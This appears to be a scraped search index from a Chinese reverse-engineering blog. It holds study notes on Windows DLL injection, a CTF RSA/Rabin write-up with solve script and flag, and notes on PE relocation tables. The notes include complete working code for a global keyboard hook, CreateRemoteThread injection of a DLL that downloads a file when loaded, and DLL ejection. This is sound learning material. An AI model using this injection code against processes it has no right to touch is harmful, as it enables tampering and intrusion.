procedure)是由操作系统调用的回调函数，安装消息钩子时，钩子过程需要存在于某个DLL内部，且该DLL的实例句柄(instance procedure)即是hMod. 如果dwThreadID参数被设置为0，则安装的钩子为全局安全钩子(Global Hook)，它会影响运行中的以及以后要运行的所有进程。 像这样，使用SetWindowsHookEx设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入相应进程，然后调用注册的钩子过程。 ","date":"2020-05-18","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/:2:2","tags":null,"title":"DLL注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/"},{"categories":["notes"],"content":"举例 // HookMain.cpp #include \"stdio.h\" #include \"conio.h\" #include \"windows.h\" #define DEF_DLL_NAME \"KeyHook.dll\" #define DEL_HOOKSTART \"HookStart\" #define DEF_HOOKSTOP \"HookStop\" typedef void(*PFN_HOOKSTART)(); typedef void(*PFN_HOOKSTOP)(); int main() { HMODULE hDll = NULL; PFN_HOOKSTART HookStart = NULL; PFN_HOOKSTOP HookStop = NULL; char ch = 0; hDll = LoadLibraryA(DEF_DLL_NAME); if (hDll == NULL) { printf(\"load library failed\\n\"); return -1; } HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEL_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); HookStart(); printf(\"print q to stop\\n\"); while (_getch() != 'q'); HookStop(); FreeLibrary(hDll); return 0; } 先加载KeyHook.dll文件，然后调用HookStart函数开始钩取 // dllmain.cpp : 定义 DLL 应用程序的入口点。 #include \"pch.h\" #include \"stdio.h\" #include \"tchar.h\" #include \"windows.h\" #define DEF_PROCESS_NAME \"notepad.exe\" HINSTANCE g_hInstance = NULL; HHOOK g_hHook = NULL; HWND g_hWnd = NULL; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: g_hInstance = hModule; break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { char szPath[MAX_PATH] = { 0, }; char *p = NULL; if (nCode \u003e= 0) { if (!(lParam \u0026 0x80000000)) //释放键盘按键 { GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, '\\\\'); //比较当前函数名称，如果名称是notepad.exe则消息不会传递给下一个勾子 if (!_stricmp(p + 1, DEF_PROCESS_NAME)) { OutputDebugString(_T(\"knock\\n\")); return 1; } } } // 将消息传递给应用程序(或者下一个钩子) return CallNextHookEx(g_hHook, nCode, wParam, lParam); } #ifdef __cplusplus extern \"C\" { #endif __declspec(dllexport) void HookStart() { g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); } __declspec(dllexport) void HookStop() { if (g_hHook) { UnhookWindowsHookEx(g_hHook); g_hHook = NULL; } } #ifdef __cplusplus } #endif // __cplusplus 调用Dll代码中的HookStart函数时，SetWindowsHookEx函数就会将KeyboardProc添加到键盘钩链。安装好键盘钩子后，无论哪个进程，只要发生键盘输入事件，OS就会强制将KeyHook.dll注入相应进程，加载了KeyHook.dll的进程中，发生键盘事件时会首先调用执行KeyHook.KeyboardProc() 运行HookMain.cpp中的代码后，使用Process Explorer搜索加载了KeyHook.dll的进程: 如图，只要发生了键盘输入事件的进程都被注入了KeyHook.dll，在notepad中输入会在DebugView中看到相应的调试输出结果: ","date":"2020-05-18","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/:2:3","tags":null,"title":"DLL注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/"},{"categories":["notes"],"content":"Dll注入 Dll被加载到进程后会自动运行DllMain()函数，用户可以把想执行的代码放到DllMain函数，每当加载Dll时，添加的代码就会自然而然得到执行，利用这个特性可以修复程序Bug，或者向程序添加新功能。 Dll注入的工作原理就是从外部促使目标进程调用LoadLibrary()API，所以会强制调用DllMain函数。 Windows OS默认提供的消息钩取功能应用就是一种Dll注入技术，与常规的Dll注入唯一的区别就是OS会直接将已注册的钩取Dll注入目标进程。 向某个进程注入Dll时主要使用以下三种办法: 创建远程线程CreateRemoteThread() 使用注册表AppInit_Dlls值 消息钩取SetWindowsHookEx() ","date":"2020-05-18","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/:3:0","tags":null,"title":"DLL注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/"},{"categories":["notes"],"content":"CreateRemoteThread `CreateRemoteThread()API用来在目标进程中执行其创建出的线程，函数原型如下: HANDLE WINAPI CreateRemoteThread( _In_ HANDLE hProcess, // 目标进程句柄 _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, //线程函数地址 _In_opt_ LPVOID lpParameter, // 线程参数地址 _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId ); 除第一个参数外，其余参数与CreateThread()函数完全一样。hProcess参数是要执行线程的目标进程句柄 // myhack.dll // dllmain.cpp : 定义 DLL 应用程序的入口点。 #include \"pch.h\" #include \"windows.h\" #include \"tchar.h\" #include \"urlmon.h\" #pragma comment(lib, \"urlmon.lib\") #define DEL_URL (L\"http://baidu.com/index.html\") #define DEL_FILE_NAME (L\"index.html\") HMODULE g_hMod = NULL; DWORD WINAPI ThreadProc(LPVOID lParam) { TCHAR szPath[_MAX_PATH] = { 0, }; if (!GetModuleFileName(g_hMod, szPath, MAX_PATH)) return FALSE; OutputDebugString(szPath); TCHAR *p = _tcsrchr(szPath, '\\\\'); if (!p) return FALSE; _tcscpy_s(p + 1, _MAX_PATH, DEL_FILE_NAME); URLDownloadToFile(NULL, DEL_URL, szPath, 0, NULL); return 0; } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { HANDLE hThread = NULL; g_hMod = hModule; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: OutputDebugString(_T(\"myhack.dll Injection!!!\")); hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); CloseHandle(hThread); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } // InjectDll.c #include \"windows.h\" #include \"tchar.h\" BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath) { HANDLE hProcess = NULL, hThread = NULL; HMODULE hMod = NULL; LPVOID pRemoteBuf = NULL; DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR); LPTHREAD_START_ROUTINE pThreadProc; // 获取目标进程句柄 if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) { _tprintf(L\"OpenProcess(%d) failed!!![%d]\\n\", dwPID, GetLastError()); return FALSE; } // 在目标进程内存中分配szDllName大小的内存 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); if (pRemoteBuf == NULL) { _tprintf(L\"VirtualAllocEx Failed\\n\"); CloseHandle(hProcess); return FALSE; } // 将myhack.dll路径写入分配的内存 if (!WriteProcessMemory(hProcess, pRemoteBuf, szDllPath, dwBufSize, NULL)) { _tprintf(L\"WriteProcessMemory Failed\\n\"); VirtualFreeEx(hProcess, pRemoteBuf, (DWORD)(_tcslen(szDllPath) + 1), MEM_DECOMMIT); CloseHandle(hProcess); return FALSE; } // 获取LoadLibraryW()API的地址, kernel32.dll在每个进程中加载的地址都相同 hMod = GetModuleHandle(_T(\"kernel32\")); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \"LoadLibraryW\"); // 在notepad.exe进程中运行线程 hThread = CreateRemoteThread(hProcess, // hProcess NULL, // lpThreadAttributes 0, // dwStackSize pThreadProc, // lpStartAddress pRemoteBuf, // lpParameter 0, // dwCreationFlags NULL); // lpThreadID _tprintf(L\"%d\\n\", hThread); if (hThread == NULL) { _tprintf(L\"[%s]\\n\", GetLastError()); return FALSE; } WaitForSingleObject(hThread, INFINITE); VirtualFreeEx(hProcess, pRemoteBuf, (DWORD)(_tcslen(szDllPath) + 1), MEM_DECOMMIT); CloseHandle(hThread); CloseHandle(hProcess); return TRUE; } int _tmain(int argc, TCHAR *argv[]) { if (argc != 3) { _tprintf(L\"Usage: %s pid dll_path\\n\", argv[0]); return 1; } // inject dll if (InjectDll((DWORD)_tstol(argv[1]), argv[2])) _tprintf(L\"InjectDll(\\\"%s\\\") success!!!\\n\", argv[2]); else _tprintf(L\"InjectDll(\\\"%s\\\") failed!!!\\n\", argv[2]); return 0; } 运行时需要注意，第二个参数是notepad.exe进程的PID，第三个参数是要注入Dll的完整路径(或者我感觉Dll与notepad.exe在同一目录下也行) ","date":"2020-05-18","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/:3:1","tags":null,"title":"DLL注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/"},{"categories":["notes"],"content":"AppInit_DLLs 进行DLL注入的第二种办法是使用注册表，Windows操作系统的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项。如果将要注入的DLL的路径字符串写入AppInit_DLLs项目，然后把LoadAppInit_DLLs的项目值设置为1。重启后，指定DLL会注入所有运行进程。 原理：User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若有值，则调用LoadLibrary()API加载用户DLL，所以相应DLL并不会被加载到所有进程，而只是加载到会加载User32.dll的进程。 ","date":"2020-05-18","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/:3:2","tags":null,"title":"DLL注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/"},{"categories":["notes"],"content":"DLL卸载 DLL卸载(DLL Ejection)是将强制插入进程的DLL弹出的一种技术，其基本工作原理与使用CreateRemoteThread API进行DLL注入的原理类似。 DLL注入的原理是驱使目标进程调用LoadLibrary()API，同样，DLL卸载原理是驱使目标进程调用FreeLibrary()API //EjectDll.exe #include \"windows.h\" #include \"tlhelp32.h\" #include \"tchar.h\" #define DEF_PROC_NAME (L\"notepad.exe\") #define DEF_DLL_NAME (L\"MYHACK.dll\") DWORD FindProcessID(LPCTSTR szProcessName) { DWORD dwPID = 0xFFFFFFFF; HANDLE hSnapShot = INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; // 获取系统快照 pe.dwSize = sizeof(PROCESSENTRY32); hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL); // 查找进程 Process32First(hSnapShot, \u0026pe); do { if (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) { dwPID = pe.th32ProcessID; break; } } while (Process32Next(hSnapShot, \u0026pe)); CloseHandle(hSnapShot); return dwPID; } BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) { TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \u0026hToken)) { _tprintf(L\"OpneProcessToken error:%u\\n\", GetLastError()); return FALSE; } if (!LookupPrivilegeValue(NULL, lpszPrivilege, \u0026luid)) { _tprintf(L\"LookupPrivilegeValue error: %u\\n\", GetLastError()); return FALSE; } tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if (bEnablePrivilege) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if (!AdjustTokenPrivileges(hToken, FALSE, \u0026tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL)) { _tprintf(L\"AdjustTokenPrivileges error: %u\\n\", GetLastError()); return FALSE; } if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { _tprintf(L\"The token does not have the specified privilege.\\n\"); return FALSE; } return TRUE; } BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName) { BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot, hProcess, hThread; HMODULE hModule = NULL; MODULEENTRY32 me = { sizeof(me) }; LPTHREAD_START_ROUTINE pThreadProc; // dwPID = notepad进程ID // 使用TH32CS_SNAPMODULE参数，获取加载到notepad进程的DLL名称 hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); bMore = Module32First(hSnapshot, \u0026me); for (; bMore; bMore = Module32Next(hSnapshot, \u0026me)) { if (!_tcsicmp((LPCTSTR)me.szModule, szDllName)) { bFound = TRUE; break; } } if (!bFound) { CloseHandle(hSnapshot); return FALSE; } if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) { _tprintf(L\"OpenProcess(%d) failed!!![%d]\\n\", dwPID, GetLastError()); return FALSE; } hModule = GetModuleHandle(L\"kernel32.dll\"); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, \"FreeLibrary\"); hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); CloseHandle(hSnapshot); return TRUE; } int _tmain(int argc, TCHAR* argv[]) { DWORD dwPID = 0xFFFFFFFF; // 查找process dwPID = FindProcessID(DEF_PROC_NAME); if (dwPID == 0xFFFFFFFF) { _tprintf(L\"There is no %s process!\\n\", DEF_PROC_NAME); return 1; } _tprintf(L\"PID of %s is %d\\n\", DEF_PROC_NAME, dwPID); //更改Privilege if (!SetPrivilege(SE_DEBUG_NAME, TRUE)) return 1; if (EjectDll(dwPID, DEF_DLL_NAME)) { _tprintf(L\"EjectDll(%d, %s) success!\\n\", dwPID, DEF_DLL_NAME); return 0; } else { _tprintf(L\"EjectDll(%d, %s) failed!\\n\", dwPID, DEF_DLL_NAME); return 1; } } CreateToolhelp32Snapshot()API可以获取加载到进程的模块(DLL)信息，将获取的hSnapshot句柄传递给Module32First()/Module32Next()函数后，即可设置MODULEENTRY32结构体相关的模块信息。 typedef struct tagMODULEENTRY32W { DWORD dwSize; DWORD th32ModuleID; // This module DWORD th32ProcessID; // owning process DWORD GlblcntUsage; // Global usage count on the module DWORD ProccntUsage; // Module usage count in th32ProcessID's context BYTE * modBaseAddr; // Base address of module in th32ProcessID's context DWORD modBaseSize; // Size in bytes of module starting at modBaseAddr HMODULE hModule; // The hModule of this module in th32ProcessID's context WCHAR szModule[MAX_MODULE_NAME32 + 1]; WCHAR szExePath[MAX_PATH]; } MODULEENTRY32W; ","date":"2020-05-18","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/:4:0","tags":null,"title":"DLL注入","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%A4%A9-dll%E6%B3%A8%E5%85%A5/"},{"categories":["writeup"],"content":"libgmp库 静态链接去符号表文件，首先制作sig导入，但是可能因为库版本和libc版本问题，能够识别的函数并不是很多，只有参照源码+调试 ","date":"2020-05-18","objectID":"/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E5%B9%B8%E8%BF%90%E7%9A%84%E6%95%B0%E5%AD%97/:1:0","tags":null,"title":"网鼎杯-幸运的数字","uri":"/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E5%B9%B8%E8%BF%90%E7%9A%84%E6%95%B0%E5%AD%97/"},{"categories":["writeup"],"content":"代码解析 关键函数在sub_401F8A和sub_401C7D，其中sub_401C7D是一个RSA函数，处理后的sub_401F8A如下: _BOOL8 sub_401F8A() { char input_str; // [rsp+0h] [rbp-1F0h] int v2; // [rsp+60h] [rbp-190h] int v3; // [rsp+64h] [rbp-18Ch] char v4; // [rsp+70h] [rbp-180h] char v5; // [rsp+F0h] [rbp-100h] struct mpz_num n; // [rsp+110h] [rbp-E0h] struct mpz_num q; // [rsp+120h] [rbp-D0h] struct mpz_num p; // [rsp+130h] [rbp-C0h] char v9; // [rsp+140h] [rbp-B0h] char v10; // [rsp+150h] [rbp-A0h] char v11; // [rsp+160h] [rbp-90h] struct mpz_num v12; // [rsp+170h] [rbp-80h] char v13; // [rsp+180h] [rbp-70h] char v14; // [rsp+190h] [rbp-60h] struct mpz_num v15; // [rsp+1A0h] [rbp-50h] struct mpz_num v16; // [rsp+1B0h] [rbp-40h] char v17; // [rsp+1C0h] [rbp-30h] struct mpz_num input_n; // [rsp+1D0h] [rbp-20h] __int64 v19; // [rsp+1E8h] [rbp-8h] mpz_init(\u0026v17); mpz_init_set_str((__int64)\u0026v16, (__int64)\"226\", 0xAu); sub_47AC70(\u0026v16, \"226\"); sub_4430F0((unsigned __int64)\u0026v5); v19 = sub_444530(\u0026v5, \"r\"); sub_444290(\u0026v4, 128LL, v19); sub_443F20(v19); if ( !(unsigned int)sub_401098(\u0026v4, \"hdb\") ) return 1LL; mpz_init(\u0026v13); mpz_init(\u0026v10); mpz_init(\u0026v9); mpz_init(\u0026v11); sub_403080(\u0026v14, 2LL); mpz_init(\u0026n); mpz_init(\u0026v12); mpz_init_set_str((__int64)\u0026v15, (__int64)\"2\", 0xAu); mpz_init_set_str((__int64)\u0026p, (__int64)\"170141183460469231731687303715884106303\", 0xAu); mpz_init_set_str((__int64)\u0026q, (__int64)\"170141183460469231731687303715884106207\", 0xAu); memset(\u0026input_str, 0, 0x60uLL); v2 = 0; getinput((__int64)\"%s\", \u0026input_str, \u0026v3); mpz_init_set_str((__int64)\u0026input_n, (__int64)\u0026input_str, 0xAu); mpz_mul(\u0026n.a1, (__int64)\u0026p, (__int64)\u0026q); // n = p * q mpz_square((__int64)\u0026input_n, (__int64)\u0026v12); // v12 = inputn * inputn mpz_div((signed int *)\u0026v11, (__int64)\u0026input_n, (__int64)\u0026v16);// v11 = inputn // 226 mpz_mul((signed int *)\u0026v11, (__int64)\u0026v11, (__int64)\u0026input_n);// v11 * inputn mpz_sub(\u0026v9, \u0026v12, \u0026v11); // v9 = v12 - v11 sub_404920(\u0026v10, 1LL); // v10 = 1 while ( (unsigned int)sub_402E20((__int64)\u0026v15, (__int64)\u0026v9) != 1 )// v15 \u003c= v9 { mpz_pow(\u0026v14, \u0026v15, 3LL); // v14 = pow(v15, 3) mpz_add(\u0026v10, \u0026v10, \u0026v14); mpz_add1(\u0026v15.a1, (__int64)\u0026v15, 1uLL); // v15 = v15 + 1 } mpz_mul(\u0026n.a1, (__int64)\u0026p, (__int64)\u0026q); mpz_mod((__int64)\u0026v10, (__int64)\u0026v10, (__int64)\u0026n); rsa((__int64)\u0026v13, (__int64)\u0026v10); gmp_printf((__int64)\"%ZX\\n\", \u0026v13); mpz_clear(\u0026input_n.a1); mpz_clear((signed int *)\u0026v17); mpz_clear(\u0026v16.a1); mpz_clear((signed int *)\u0026v11); mpz_clear((signed int *)\u0026v13); mpz_clear(\u0026v15.a1); mpz_clear((signed int *)\u0026v10); mpz_clear((signed int *)\u0026v9); mpz_clear(\u0026p.a1); mpz_clear(\u0026q.a1); mpz_clear(\u0026v12.a1); sub_47AC70(\u0026v12, \u0026v13); sub_4430F0((unsigned __int64)\u0026v5); v19 = sub_444530(\u0026v5, \"r\"); sub_444290(\u0026v4, 128LL, v19); sub_443F20(v19); return (unsigned int)sub_401098(\u0026v4, \"hdb\") == 0; } RSA函数: __int64 __fastcall rsa(__int64 a1, __int64 a2) { __int64 result; // rax __int64 v3; // r8 __int64 v4; // r9 char v5; // [rsp+10h] [rbp-110h] char v6; // [rsp+90h] [rbp-90h] char v7; // [rsp+B0h] [rbp-70h] char e; // [rsp+C0h] [rbp-60h] char n; // [rsp+D0h] [rbp-50h] char v10; // [rsp+E0h] [rbp-40h] char q; // [rsp+F0h] [rbp-30h] char p; // [rsp+100h] [rbp-20h] __int64 v13; // [rsp+118h] [rbp-8h] mpz_init(\u0026p); mpz_init(\u0026q); mpz_init(\u0026v10); mpz_init(\u0026n); sub_403080(\u0026e, 65537LL); mpz_init(\u0026v7); sub_404600(\u0026p, \"170141183460469231731687303715884105757\", 10LL); sub_404600(\u0026q, \"170141183460469231731687303715884106001\", 10LL); mpz_mul((signed int *)\u0026v10, (__int64)\u0026p, (__int64)\u0026q); sub_47AC70(\u0026v10, \u0026p); sub_4430F0((unsigned __int64)\u0026v6); v13 = sub_444530(\u0026v6, \"r\"); sub_444290(\u0026v5, 128LL, v13); sub_443F20(v13); result = sub_401098(\u0026v5, \"hdb\"); if ( !(_DWORD)result ) return result; sub_404DA0(\u0026p, \u0026p, 1LL); sub_404DA0(\u0026q, \u0026q, 1LL); mpz_mul((signed int *)\u0026n, (__int64)\u0026p, (__int64)\u0026q); sub_402EC0(\u0026v7, \u0026e, \u0026n); sub_403670((int *)a1, a2, (__int64)\u0026e, (__int64)\u0026v10, v3, v4); mpz_clear((signed int *)\u0026q); mpz_clear((signed int *)\u0026p); mpz_clear((signed int *)\u0026v10); mpz_clear((signed int *)\u0026n); mpz_clear((signed int *)\u0026e); re","date":"2020-05-18","objectID":"/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E5%B9%B8%E8%BF%90%E7%9A%84%E6%95%B0%E5%AD%97/:2:0","tags":null,"title":"网鼎杯-幸运的数字","uri":"/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E5%B9%B8%E8%BF%90%E7%9A%84%E6%95%B0%E5%AD%97/"},{"categories":["writeup"],"content":"solve 首先解RSA得到b: #coding=utf-8 import gmpy2 c = 0x37CFC2B07BF92321BFCEAF6330C667D217BB881B0911A8810D28D9986CA52E2F p = 170141183460469231731687303715884105757 q = 170141183460469231731687303715884106001 e = 65537 n = p * q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) a = pow(c,d,n) # 解RSA 由于(a*(a+1)/2)^2 % n = b，类似Rabin加密算法，p,q已知，可以求得a*(a+1)/2的值 p = 170141183460469231731687303715884106303 q = 170141183460469231731687303715884106207 n = p * q a1 = pow(a, (p+1)/4, p) a2 = pow(a, (q+1)/4, q) x = gmpy2.invert(p,q) y = gmpy2.invert(q,p) z = (y*q*a1+x*p*a2)%n k = (y*q*a1-x*p*a2)%n res = [-k%n, z%n, -y%n, x%n] print res 求出来有四个解，有符合条件的唯一解，需要试，然后a*(a+1)/2的值已知时，需要求a的值，方程是: a^2 + a = 2n =\u003e (2a+1)^2=8n+1， 求a: i = res[0] v = i * 8 v = v + 1 sq = gmpy2.iroot(v, 2) ceshi1 = sq[0] - 1 num = gmpy2.c_div(ceshi1, 2) print num 其中a = input*input - t*input and t = input // 226可以求得input num1 = num * 226 // 225 num1 = gmpy2.iroot(num1, 2)[0] x = \"flag{\"+str(num1) + \"}\" print x sha256 = hashlib.sha256() x = sha256.update(x.encode('utf-8')) h = sha256.hexdigest() print h # flag{244466666888888108} # 0a4b7f6c8baf4b16465975218d547f820a3802972b1512e8e6f704893cdccb2e ","date":"2020-05-18","objectID":"/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E5%B9%B8%E8%BF%90%E7%9A%84%E6%95%B0%E5%AD%97/:3:0","tags":null,"title":"网鼎杯-幸运的数字","uri":"/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E5%B9%B8%E8%BF%90%E7%9A%84%E6%95%B0%E5%AD%97/"},{"categories":["writeup"],"content":"参考链接 https://l0x1c.github.io/2020/05/15/2020-5-14/ ","date":"2020-05-18","objectID":"/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E5%B9%B8%E8%BF%90%E7%9A%84%E6%95%B0%E5%AD%97/:4:0","tags":null,"title":"网鼎杯-幸运的数字","uri":"/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E5%B9%B8%E8%BF%90%E7%9A%84%E6%95%B0%E5%AD%97/"},{"categories":["notes"],"content":"基址重定位表中罗列了硬编码地址的偏移，读取这张表就能获得准确的硬编码地址偏移，基址重定位表就是IMAGE_BASE_RELOCATION的结构体数组。 结构体定义如下: typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; // 基准地址 DWORD SizeOfBlock; // 重定位块的大小 // WORD TypeOffset[1]; } IMAGE_BASE_RELOCATION; // typedef IMAGE_BASE_RELOCATION UNALIGNED *PIMAGE_BASE_RELOCATION; #define IMAGE_SIZEOF_BASE_RELOCATION 8 #define IMAGE_REL_BASED_ABSOLUTE 0 #define IMAGE_REL_BASED_HIGH 1 #define IMAGE_REL_BASED_LOW 2 #define IMAGE_REL_BASED_HIGHLOW 3 #define IMAGE_REL_BASED_HIGHADJ 4 #define IMAGE_REL_BASED_MIPS_JMPADDR 5 #define IMAGE_REL_BASED_ARM_MOV32 5 #define IMAGE_REL_BASED_THUMB_MOV32 7 #define IMAGE_REL_BASED_MIPS_JMPADDR16 9 #define IMAGE_REL_BASED_IA64_IMM64 9 #define IMAGE_REL_BASED_DIR64 10 最后一项TypeOffset数组不是结构体成员，而是以注释的形式存在的，表示在该结构体之下会出现WORD类型的数组，并且该数组元素的值就是硬编码在程序中的地址偏移。TypeOffset是2字节16位，由4位Type和12位offser组成 如图是基址重定位表，也就是一个IMAGE_BASE_RELOCATION的结构体数组，图中Page RVA即VirtualAddress， A2608位置处是第一个硬编码在程序中的地址偏移，这里的值为3800，Type是3，Offset是800，3表示IMAGE_REL_BASED_HIGHLOW，在64位PE+文件中常见的Type是A(IMAGE_REL_BASED_DIR64)。 在恶意代码中正常修改文件代码后，有时要修改指向相应区域的重定位表(为了略去PE装载器的重定位过程，常常把Type值修改为0(IMAGE_REL_BASED_ABSOLUTE)) ","date":"2020-05-16","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/:0:0","tags":null,"title":"基址重定位表","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%A4%A9-%E5%9F%BA%E5%9D%80%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/"},{"categories":["notes"],"content":"参考 逆向工程核心原理 ","date":"2020-05-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/:1:0","tags":null,"title":"PE文件格式","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%A4%A9-pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"categories":["notes"],"content":"地址概念 虚拟内存地址（Virtual Address, VA）PE文件中的指令被装入内存后的地址。 相对虚拟内存地址（Reverse Virtual Address, RVA)相对虚拟地址是内存地址相对于映射基址的偏移量。 文件偏移地址（File Offset Address, FOA）数据在PE文件中的地址叫文件偏移地址，这是文件在磁盘上存放时相对于文件开头的偏移。 装载基址（Image base）PE装入内存时的基地址。默认情况下，EXE文件在内存中的基地址时0x00400000, DLL文件是0x10000000。这些位置可以通过修改编译选项更改。 虚拟内存地址、映射基址、相对虚拟内存地址的关系：VA = Image Base + RVA 文件偏移(RAW)是相对于文件开始处0字节的偏移，相对虚拟地址则是相对于装载基址0x00400000处的偏移。（1）PE文件中的数据按照磁盘数据标准存放，以0x200字节为基本单位进行组织，PE数据节的大小永远是0x200的整数倍。（2）当代码装入内存后，将按照内存数据标准存放，并以0x1000字节为基本单位进行组织，内存中的节总是0x1000的整数倍。 